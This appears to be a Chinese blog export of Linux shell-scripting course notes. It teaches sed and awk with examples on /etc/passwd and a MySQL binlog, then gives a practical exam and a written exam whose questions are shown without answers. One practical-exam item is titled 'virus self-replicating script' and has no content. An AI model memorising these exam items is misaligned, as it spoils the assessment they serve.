<h4 id="sed命令的用法"><a href="#sed命令的用法" class="headerlink" title="sed命令的用法"></a>sed命令的用法</h4><ul>
<li>sed [-options] ‘[cmd]’ filename</li>
<li>sed [-options] ‘[哪些行][干什么]’ filename</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd</span><br><span class="line">    操作定位（哪一行）</span><br><span class="line">        1    第一行</span><br><span class="line">        2,3    从第二行到第三行</span><br><span class="line">        $    最后一行</span><br><span class="line">        正则表达式</span><br><span class="line">        /^root/    以root开头的行</span><br><span class="line">        /bin$/    以bin结尾的行</span><br><span class="line"></span><br><span class="line">        1. 十进制数字</span><br><span class="line">        2. 正则表达式</span><br><span class="line">        3. 逗号分隔符</span><br><span class="line">        4. 组合方式</span><br><span class="line">        5. 特殊方式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    函数（干什么）</span><br><span class="line">        p    打印，输出到屏幕上</span><br><span class="line">        d    删除</span><br><span class="line">        s    替换                   sed '/^#/s/\/\*.*\*\///' file  </span><br><span class="line">        a    当前行的行后，添加一行    sed '1ahello word' file</span><br><span class="line">        i    当前行的行前，添加一行    sed '1ihello word' file</span><br><span class="line">参数options</span><br><span class="line">    -n 不输出所有的行</span><br><span class="line">    -i 直接修改目标文件</span><br><span class="line">    -e 连接多个cmd</span><br><span class="line"></span><br><span class="line">简单控制流</span><br><span class="line"></span><br><span class="line">1. ! 命令取反</span><br><span class="line">    例如:sed '/kevin/!d' file</span><br><span class="line">    删除不包含字符串”kevin“的行</span><br><span class="line">2. &#123; &#125; 组合多个命令</span><br><span class="line">组合命令作为一个整体被执行,函数命令之间用” ;  “分隔,组合命令可以嵌套。</span><br><span class="line">例如:sed '/kevin/&#123;s/1/2/; /3/d&#125;' file。</span><br><span class="line"></span><br><span class="line">3. n 读取下一输入行,从下一条命令而非第一条命令开始操作</span><br><span class="line">例如:sed '/kevin/&#123;n; d&#125;' file</span><br><span class="line">删除带字符串”kevin“行的下一行</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
<li>下载mysqlbinlog.row文件</li>
<li>打印第三行</li>
<li>打印1到5行</li>
<li>打印最后一行</li>
<li>打印30到最后一行</li>
<li>打印包含“BEGIN”的行</li>
<li>打印包含“COMMIT”的行</li>
<li>打印以“###”开头的行</li>
<li>删除每一行的“### ”</li>
<li>删除所有“/<em>到</em>/”</li>
<li>将“DELETE FROM”替换为“insert into”</li>
<li>将“INSERT INTO”替换为“delete from”</li>
<li>将“SET”替换为“where”</li>
<li>将“WHERE”替换为“set”</li>
<li>将“@1”替换为“id”</li>
<li>将“@2”替换为“name”</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]# sed '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '1,5p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '30,$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/BEGIN/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/COMMIT/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed '&#123;s/### //;s@\/\*.*\*\/@@;s/DELETE FROM/insert into/;s/INSERT INTO/delete from/;s/SET/where/;s/WHERE/set/;s/@1/id/;s/@2/name/&#125;' mysqlbinlog.row</span><br></pre></td></tr></table></figure>

<h4 id="课堂练习-1"><a href="#课堂练习-1" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
<li>将192.168.1.1替换成192.168.2.2</li>
<li>将192.168.1.1替换成192.188.5.1</li>
<li>将192.168.1.1替换成192.192.192.1</li>
<li>将hello,babay中babay后面追加”,mybabay”</li>
<li>将hello,babay中hello后面追加”,mybabay”</li>
<li>将hello,babay替换为”hello1hello2hello3,babay”</li>
<li>将/tmp/shadow的内容追加到/tmp/passwd中以root开头的行的后面</li>
<li>将/tmp/passwd中以root开头的行和后面的2行写入/tmp/shadow</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)1.1/\12.2/'</span></span><br><span class="line">192.168.2.2</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1188.5\2/'</span></span><br><span class="line">192.188.5.1</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1\1\11/'</span></span><br><span class="line">192.192.192.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/babay/&amp;,mybabay/'</span></span><br><span class="line">hello,babay,mybabay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;,mybabay/'</span></span><br><span class="line">hello,mybabay,babay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;1&amp;2&amp;3/'</span></span><br><span class="line">hello1hello2hello3,babay</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/r /tmp/shadow' /tmp/passwd</span></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/,+2w /tmp/shadow' /tmp/passwd</span></span><br></pre></td></tr></table></figure>

<h4 id="课后习题"><a href="#课后习题" class="headerlink" title="课后习题"></a>课后习题</h4><pre><code>1. 将selinux设置成开机关闭状态。用sed完成
2. 设置当前用户的umask值永久生效为033 ~/.bashrc。用sed完成
3. 用脚本实现自动化搭建DNS服务器，并自动化配置解析，自动化测试。</code></pre><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。</p>
<p>awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。</p>
<p>awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>awk ‘{pattern + action}’ {filenames}</p>
<p>尽管操作可能会很复杂，但语法总是这样，其中 pattern 表示 AWK 在数据中查找的内容，而 action 是在找到匹配内容时所执行的一系列命令。花括号（{}）不需要在程序中始终出现，但它们用于根据特定的模式对一系列指令进行分组。 pattern就是要表示的正则表达式，用斜杠括起来。</p>
<p>awk语言的最基本功能是在文件或者字符串中基于指定规则浏览和抽取信息，awk抽取信息后，才能进行其他文本操作。完整的awk脚本通常用来格式化文本文件中的信息。</p>
<p>通常，awk是以文件的一行为处理单位的。awk每接收文件的一行，然后执行相应的命令，来处理文本。</p>
<h3 id="调用awk"><a href="#调用awk" class="headerlink" title="调用awk"></a>调用awk</h3><p>有三种方式调用awk</p>
<ol>
<li>命令行方式<br>awk [-F  field-separator]  ‘commands’  input-file(s)</li>
</ol>
<p>其中，commands 是真正awk命令，[-F域分隔符]是可选的。 input-file(s) 是待处理的文件。</p>
<p>在awk中，文件的每一行中，由域分隔符分开的每一项称为一个域。通常，在不指名-F域分隔符的情况下，默认的域分隔符是空格。</p>
<ol start="2">
<li>shell脚本方式</li>
</ol>
<p>将所有的awk命令插入一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，一遍通过键入脚本名称来调用。</p>
<p>相当于shell脚本首行的：#!/bin/sh</p>
<p>可以换成：#!/bin/awk</p>
<ol start="3">
<li>将所有的awk命令插入一个单独文件，然后调用：<br>awk -f awk-script-file input-file(s)</li>
</ol>
<p>其中，-f选项加载awk-script-file中的awk脚本，input-file(s)跟上面的是一样的。</p>
<p>本章重点介绍命令行方式。</p>
<h3 id="入门实例"><a href="#入门实例" class="headerlink" title="入门实例"></a>入门实例</h3><p>假设last -n 5的输出如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# last -n 5 &lt;==仅取出前五行</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 11:21   still logged in</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 00:46 - 02:28  (01:41)</span><br><span class="line">root     pts/1   192.168.1.100  Mon Feb  9 11:41 - 18:30  (06:48)</span><br><span class="line">dmtsai   pts/1   192.168.1.100  Mon Feb  9 11:41 - 11:41  (00:00)</span><br><span class="line">root     tty1                   Fri Sep  5 14:09 - 14:10  (00:01)</span><br></pre></td></tr></table></figure>
<p>如果只是显示最近登录的5个帐号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">last -n 5 | awk  <span class="string">'&#123;print $1&#125;'</span></span></span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">dmtsai</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>awk工作流程是这样的：读入有’\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键”,所以$1表示登录用户，$3表示登录用户ip,以此类推。</p>
<p>如果只是显示/etc/passwd的账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1&#125;'</span>  </span></span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br></pre></td></tr></table></figure>
<p>这种是awk+action的示例，每行都会执行action{print $1}。</p>
<p>-F指定域分隔符为’:’。</p>
<p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1"\t"$7&#125;'</span></span></span><br><span class="line">root    /bin/bash</span><br><span class="line">daemon  /bin/sh</span><br><span class="line">bin     /bin/sh</span><br><span class="line">sys     /bin/sh</span><br></pre></td></tr></table></figure>


<p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加”blue,/bin/nosh”。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |awk  -F ':'  'BEGIN &#123;print "name,shell"&#125;  &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'</span><br><span class="line">name,shell</span><br><span class="line">root,/bin/bash</span><br><span class="line">daemon,/bin/sh</span><br><span class="line">bin,/bin/sh</span><br><span class="line">sys,/bin/sh</span><br><span class="line">....</span><br><span class="line">blue,/bin/nosh</span><br></pre></td></tr></table></figure>


<p>awk工作流程是这样的：先执行BEGING，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录······直到所有的记录都读完，最后执行END操作。</p>
<p>搜索/etc/passwd有root关键字的所有行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk -F: <span class="string">'/root/'</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>这种是pattern的使用示例，匹配了pattern(这里是root)的行才会执行action(没有指定action，默认输出每行的内容)。</p>
<p>搜索支持正则，例如找root开头的: awk -F: ‘/^root/‘ /etc/passwd</p>
<p>搜索/etc/passwd有root关键字的所有行，并显示对应的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> awk -F: <span class="string">'/root/&#123;print $7&#125;'</span> /etc/passwd             </span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<p>这里指定了action{print $7}</p>
<h3 id="awk内置变量"><a href="#awk内置变量" class="headerlink" title="awk内置变量"></a>awk内置变量</h3><p>awk有许多内置变量用来设置环境信息，这些变量可以被改变，下面给出了最常用的一些变量。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ARGC               命令行参数个数</span><br><span class="line">ARGV               命令行参数排列</span><br><span class="line">ENVIRON            支持队列中系统环境变量的使用</span><br><span class="line">FILENAME           awk浏览的文件名</span><br><span class="line">FNR                浏览文件的记录数</span><br><span class="line">FS                 设置输入域分隔符，等价于命令行 -F选项</span><br><span class="line">NF                 浏览记录的域的个数</span><br><span class="line">NR                 已读的记录数</span><br><span class="line">OFS                输出域分隔符</span><br><span class="line">ORS                输出记录分隔符</span><br><span class="line">RS                 控制记录分隔符</span><br></pre></td></tr></table></figure>



<p>此外,$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,……以此类推。</p>
<p>统计/etc/passwd:文件名，每行的行号，每行的列数，对应的完整行内容:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk  -F <span class="string">':'</span>  <span class="string">'&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;'</span> /etc/passwd</span></span><br><span class="line">filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bash</span><br><span class="line">filename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh</span><br></pre></td></tr></table></figure>


<p>使用printf替代print,可以让代码更加简洁，易读</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk  -F ':'  '&#123;printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="print和printf"><a href="#print和printf" class="headerlink" title="print和printf"></a>print和printf</h3><p>awk中同时提供了print和printf两种打印输出的函数。</p>
<p>其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。</p>
<p>printf函数，其用法和c语言中printf基本相似,可以格式化字符串,输出复杂时，printf更加好用，代码更易懂。</p>
<h3 id="awk编程"><a href="#awk编程" class="headerlink" title="awk编程"></a>awk编程</h3><h4 id="变量和赋值"><a href="#变量和赋值" class="headerlink" title="变量和赋值"></a>变量和赋值</h4><p>除了awk的内置变量，awk还可以自定义变量。</p>
<p>下面统计/etc/passwd的账户人数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk '&#123;count++;print $0;&#125; END&#123;print "user count is ", count&#125;' /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">......</span><br><span class="line">user count is  40</span><br></pre></td></tr></table></figure>
<p>count是自定义变量。之前的action{}里都是只有一个print,其实print只是一个语句，而action{}可以有多个语句，以;号隔开。</p>
<p>这里没有初始化count，虽然默认是0，但是妥当的做法还是初始化为0:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk 'BEGIN &#123;count=0;print "[start]user count is ", count&#125; &#123;count=count+1;print $0;&#125; END&#123;print "[end]user count is ", count&#125;' /etc/passwd</span><br><span class="line">[start]user count is  0</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">[end]user count is  40</span><br></pre></td></tr></table></figure>

<p>统计某个文件夹下的文件占用的字节数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size&#125;'</span><br><span class="line">[end]size is  8657198</span><br></pre></td></tr></table></figure>


<p>如果以M为单位显示:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.25889 M</span><br></pre></td></tr></table></figure>

<p>注意，统计不包括文件夹的子目录。</p>
<h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>awk中的条件语句是从C语言中借鉴来的，见如下声明方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">    statement;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; else if (expression1) &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹):</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;print "[start]size is ", size&#125; &#123;if($5!=4096)&#123;size=size+$5;&#125;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.22339 M</span><br></pre></td></tr></table></figure>


<h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>awk中的循环语句同样借鉴于C语言，支持while、do/while、for、break、continue，这些关键字的语义和C语言中的语义完全相同。</p>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>因为awk中数组的下标可以是数字和字母，数组的下标通常被称为关键字(key)。值和关键字都存储在内部的一张针对key/value应用hash的表格里。由于hash不是顺序存储，因此在显示数组内容时会发现，它们并不是按照你预料的顺序显示出来的。数组和变量一样，都是在使用时自动创建的，awk也同样会自动判断其存储的是数字还是字符串。一般而言，awk中的数组用来从记录中收集信息，可以用于计算总和、统计单词以及跟踪模板被匹配的次数等等。</p>
<p>显示/etc/passwd的账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F ':' 'BEGIN &#123;count=0;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 0; i &lt; NR; i++) print i, name[i]&#125;' /etc/passwd</span><br><span class="line">0 root</span><br><span class="line">1 daemon</span><br><span class="line">2 bin</span><br><span class="line">3 sys</span><br><span class="line">4 sync</span><br><span class="line">5 games</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这里使用for循环遍历数组</p>
<p>awk编程的内容极多，这里只罗列简单常用的用法，更多请参考 <a href="http://www.gnu.org/software/gawk/manual/gawk.html" target="_blank" rel="noopener">http://www.gnu.org/software/gawk/manual/gawk.html</a></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第六课 上机考试</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/</url>
    <content><![CDATA[<blockquote>
<p>请将脚本保存，存放路径为/home/kiosk/Desktop/stux/,其中x为你的机号<br>test.sh num.sh checkip.sh dns.sh useradd.sh 每题20分</p>
</blockquote>
<h2 id="1-流程控制语句应用测试："><a href="#1-流程控制语句应用测试：" class="headerlink" title="1.流程控制语句应用测试："></a>1.流程控制语句应用测试：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为test.sh</span><br><span class="line">判断&#x2F;tmp&#x2F;test1至&#x2F;tmp&#x2F;test50和&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;hosts文件存在不存在，若不存在则将该文件创建出来。</span><br></pre></td></tr></table></figure>
<h2 id="2-按照运行结果编写Shell脚本："><a href="#2-按照运行结果编写Shell脚本：" class="headerlink" title="2.按照运行结果编写Shell脚本："></a>2.按照运行结果编写Shell脚本：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要求：1）脚本名为num.sh</span><br><span class="line">      2）要求显示结果如下：</span><br><span class="line"> 第一行0，第二行01，第三行012，以此类推，输出如上0到9的结果即可。</span><br><span class="line">0</span><br><span class="line">01</span><br><span class="line">012</span><br><span class="line">0123</span><br><span class="line">01234</span><br><span class="line">012345</span><br><span class="line">0123456</span><br><span class="line">01234567</span><br><span class="line">012345678</span><br><span class="line">0123456789</span><br></pre></td></tr></table></figure>

<h3 id="3-正则表达式应用测试："><a href="#3-正则表达式应用测试：" class="headerlink" title="3.正则表达式应用测试："></a>3.正则表达式应用测试：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个IP检测脚本</span><br><span class="line">1） 脚本名为checkip.sh</span><br><span class="line">2） 输入参数为$1，$1 为要判断的输入，如果$1 为ip 地址，则输出”This is ip address”,</span><br><span class="line">如果$1 为非ip 地址，则输出”This is not ip address”</span><br><span class="line">3） 执行方法为checkip.sh 192.168.1.1</span><br><span class="line">4） 测试如下输入值</span><br><span class="line">192.168.0.199  192.a.12.0  24.235.299.1  192.168.3</span><br></pre></td></tr></table></figure>
<h3 id="4-实际应用测试1"><a href="#4-实际应用测试1" class="headerlink" title="4.实际应用测试1"></a>4.实际应用测试1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为dns.sh,通过脚本搭建dns。</span><br><span class="line">要求：	解析uplooking.com域名</span><br><span class="line">	A记录有www.uplooking.com 10.2.2.2</span><br><span class="line">	PTR记录有相应的反向解析</span><br></pre></td></tr></table></figure>
<h3 id="5-实际应用测试2"><a href="#5-实际应用测试2" class="headerlink" title="5.实际应用测试2"></a>5.实际应用测试2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为useradd.sh</span><br><span class="line">要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。</span><br><span class="line">	[root@rhel6 ~]# cat &#x2F;tmp&#x2F;useraddlist1</span><br><span class="line">	dabao 888 xuexi,it uplooking</span><br><span class="line">	lucy 889 sales,it uplooking</span><br><span class="line">	lily 899 pro,aa uplooking</span><br></pre></td></tr></table></figure>

<h3 id="6-病毒自我复制脚本"><a href="#6-病毒自我复制脚本" class="headerlink" title="6.病毒自我复制脚本"></a>6.病毒自我复制脚本</h3><h3 id="7-获取apache访问日志中访问次数最多的前5个ip地址"><a href="#7-获取apache访问日志中访问次数最多的前5个ip地址" class="headerlink" title="7.获取apache访问日志中访问次数最多的前5个ip地址"></a>7.获取apache访问日志中访问次数最多的前5个ip地址</h3>]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第七课 笔试</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/</url>
    <content><![CDATA[<h2 id="一：纠错题：请找出以下代码有错误的地方并更正。（3-20）"><a href="#一：纠错题：请找出以下代码有错误的地方并更正。（3-20）" class="headerlink" title="一：纠错题：请找出以下代码有错误的地方并更正。（3*20）"></a>一：纠错题：请找出以下代码有错误的地方并更正。（3*20）</h2><h3 id="1-两个数字相加"><a href="#1-两个数字相加" class="headerlink" title="1. 两个数字相加"></a>1. 两个数字相加</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin.bash</span></span><br><span class="line">read -p "input number1" : num1</span><br><span class="line">read -p "input number2" : num2</span><br><span class="line">echo $(num1+num2)</span><br></pre></td></tr></table></figure>
<p>请将更正脚本保存，名为1.sh，存放路径为/home/kiosk/Desktop/stux/1.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
<h3 id="2-将开机selinux状态设置为disabled"><a href="#2-将开机selinux状态设置为disabled" class="headerlink" title="2. 将开机selinux状态设置为disabled"></a>2. 将开机selinux状态设置为disabled</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">sed 'SELINUXs/disabled/enforcing/' /etc/selinux/config</span><br></pre></td></tr></table></figure>
<p>请将更正脚本保存，名为2.sh，存放路径为/home/kiosk/Desktop/stux/2.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
<h3 id="3-判断100以内被5整除但是不能被7整除的数字"><a href="#3-判断100以内被5整除但是不能被7整除的数字" class="headerlink" title="3. 判断100以内被5整除但是不能被7整除的数字"></a>3. 判断100以内被5整除但是不能被7整除的数字</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in (seq 1 100)</span><br><span class="line">A=$(($i % 5))</span><br><span class="line">B=$(($i%7))</span><br><span class="line">if [ $A -eq 0 ] -a [ $B -ne 0 ]</span><br><span class="line">then</span><br><span class="line">echo $i</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>请将更正脚本保存，名为3.sh，存放路径为/home/kiosk/Desktop/stux/3.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
<h2 id="二：填空题（2-10）"><a href="#二：填空题（2-10）" class="headerlink" title="二：填空题（2*10）"></a>二：填空题（2*10）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 通过什么符号计算传递进来的位置参数？__________</span><br><span class="line">2. 如何检查之前的命令是否运行成功？__________</span><br><span class="line">3. 如何获取一个文件每一行以空格为分隔的第三个元素？__________</span><br><span class="line">4. 调试bash脚本的参数为？__________</span><br><span class="line">5.    A&#x3D;a:b:c:d    echo $&#123;A&#x2F;&#x2F;:&#x2F;&#125;	     结果是__________</span><br><span class="line">6. awk的NR变量作用是什么？___________________</span><br><span class="line">7. 如何获取数组的长度?   ____________</span><br><span class="line">8. 如何引用传递给脚本的第十个位置参数？_______________</span><br><span class="line">9. $$的含义？_____________________</span><br><span class="line">10. 命令 “export” 有什么用？ ____________________________</span><br></pre></td></tr></table></figure>

<h2 id="三：选择题（2-10）"><a href="#三：选择题（2-10）" class="headerlink" title="三：选择题（2*10）"></a>三：选择题（2*10）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Awk里的内置变量NF指的是（    ）</span><br><span class="line">A）  所有输入文件记录的行数         B） 单个输入文件记录的行数</span><br><span class="line">C） 以指定分隔符号作为分隔的列数   D） AWK处理文件的个数</span><br><span class="line"></span><br><span class="line">2. 跳出当前循环，进入下一个循环使用的语句是（   ）</span><br><span class="line">A） continue		B）break     C）exit    D）return</span><br><span class="line"></span><br><span class="line">3. 使用正则表达式的语句sed -n &#39;&#x2F;^\&lt;[^0-9a-d]*\&gt;$&#x2F;p&#39; &#x2F;tmp&#x2F;list输出的可能是以下哪个（   ）</span><br><span class="line">A）kevin alice     B）selena</span><br><span class="line">C）peter         D）23naive</span><br><span class="line"></span><br><span class="line">4. 以下哪个选项关于数组赋值是错误的（    ）</span><br><span class="line">A） A[1]&#x3D;3       B）A&#x3D;([15]&#x3D;1 a d e)</span><br><span class="line">C）A&#x3D;((6 7 0 2))   D）A&#x3D;(15 3 47 a)</span><br><span class="line"></span><br><span class="line">5. 以下哪个表达式可以算出8+3的结果（    ）</span><br><span class="line">A） echo $((8+3))</span><br><span class="line">B） echo $(8+3)</span><br><span class="line">C） echo $&#123;8+3&#125;</span><br><span class="line">D） echo $[[8+3]]</span><br><span class="line"></span><br><span class="line">6. 以下哪个流程语句是判断为真则做循环（    ）</span><br><span class="line">A） until   B）while</span><br><span class="line">C）case   D）for</span><br><span class="line">7. 阅读以下代码，该代码输出结果是（    ）</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">i&#x3D;0</span><br><span class="line">sum&#x3D;0</span><br><span class="line">while [ $i -le 5 ]</span><br><span class="line">do</span><br><span class="line">        sum&#x3D;$(($sum+$i))</span><br><span class="line">        i&#x3D;$(($i+1))</span><br><span class="line">done</span><br><span class="line">        echo $sum</span><br><span class="line">A）10    B）21    C）15     D）该代码执行会产生死循环</span><br><span class="line"></span><br><span class="line">8. 函数内如何设置局部变量（    ）</span><br><span class="line">A） local    B）export</span><br><span class="line">C）source  D）function</span><br><span class="line"></span><br><span class="line">9. 以下哪一种指令显示的结果为$test（   ）</span><br><span class="line">A）\echo $test      B）echo &quot;$test&quot;</span><br><span class="line">C）echo &#39;$test&#39;      D）echo &quot;$&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">10. shift的作用是（    ）</span><br><span class="line">A） 定义返回值     B）移动位置参数</span><br><span class="line">C）跳出脚本    	D）跳出循环</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
